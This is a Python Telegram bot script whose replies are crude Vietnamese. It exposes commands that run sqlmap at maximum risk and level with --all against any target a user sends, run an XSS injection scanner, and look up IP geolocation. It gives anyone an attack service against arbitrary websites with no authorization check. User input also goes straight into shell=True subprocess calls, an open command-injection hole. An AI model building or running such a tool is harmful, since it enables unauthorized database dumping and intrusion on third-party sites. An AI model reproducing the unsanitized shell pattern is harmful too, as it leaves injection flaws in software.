import telebot
import os 
import subprocess
import requests

TOKEN = 'Insert Your Shit Token Here'
bot = telebot.TeleBot(TOKEN)

@bot.message_handler(commands=['start'])
def start(message):
    print(f'Received start command: {message.text}')
    bot.reply_to(message, 'Hello, bố m là phong, đéo biết gì thì gõ help đi')

@bot.message_handler(commands=['help'])
def help(message):
    print(f'Received help command: {message.text}')
    bot.reply_to(message, 'chắc là m đ biết dùng bot nên mới help nhỉ thôi để anh cho m xem hdsd: \n /geoip : để geoip(tìm thông tin liên quan tới ip) \n /sqlmap : để chạy sqlmap exploit target đó mày\n /xss : để scan + inject vuln xss  \n\n cách dùng : /sqlmap target.com \n /geoip 1.1.1.1 \n /xss target.com')

@bot.message_handler(commands=['geoip'])
def geoip(message):
    print(f'Received geoip command: {message.text}')
    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Dmm IP đâu mày?')
        return
    ip_address = message.text.split()[1]
    url = f'http://ip-api.com/json/{ip_address}'

    try:
        response = requests.get(url)
        data = response.json()

        if data['status'] == 'fail':
            bot.reply_to(message, 'Không tìm thấy thông tin cho địa chỉ IP này.')
        else:
            country = data['country']
            city = data['city']
            isp = data['isp']
            reply_message = f'Địa chỉ IP: {ip_address}\nQuốc gia: {country}\nThành phố: {city}\nNhà cung cấp dịch vụ internet: {isp}'
            bot.reply_to(message, reply_message)
    except requests.exceptions.RequestException as e:
        bot.reply_to(message, 'Dm lỗi r chắc do api hoặc ip m đưa đéo đúng, thử lại lúc khác đi cu.')

@bot.message_handler(commands=['sqlmap'])
def sqlmap(message):
    print(f'Received sqlmap command: {message.text}')
    if len(message.text.split()) < 2:
        bot.reply_to(message, 'Dm mày ném target đây')
        return
    target = message.text.split()[1]
    arguments = '--all --threads=10 --risk=3 --level=5 --random-agent --batch --time-sec=2 --delay=2 --tamper=space2comment --hex'

    try:
        command = f'sqlmap --url {target} {arguments}'
        output = subprocess.check_output(command, shell=True).decode('utf-8')
        bot.reply_to(message, 'Tao inject xong r\n' + output)
    except subprocess.CalledProcessError as e:
        bot.reply_to(message, 'Có lỗi xảy ra r.')
        
@bot.message_handler(commands=['xss'])
def xsstrike(message):
  print(f'Received xsstrike command: {message.text}')
  if len(message.text.split()) < 2:
    bot.reply_to(message, 'Dm mày ném target đây')
    return
  target = message.text.split()[1]
  
  try:
    command = f'xxtrike -u {target}'
    output = subprocess.check_output(command, shell=True).decode('utf-8')
    bot.reply_to(message, 'Tao inject xong r\n' + output)
  except subprocess.CalledProcessError as e:
    bot.reply_to(message, 'Có lỗi xảy ra r.')
        
    

@bot.message_handler(func=lambda message: True)
def echo(message):
    print(f'Received message: {message.text}')
    bot.reply_to(message, 'Mày sủa cái đb gì đấy?.')
    
bot.polling()
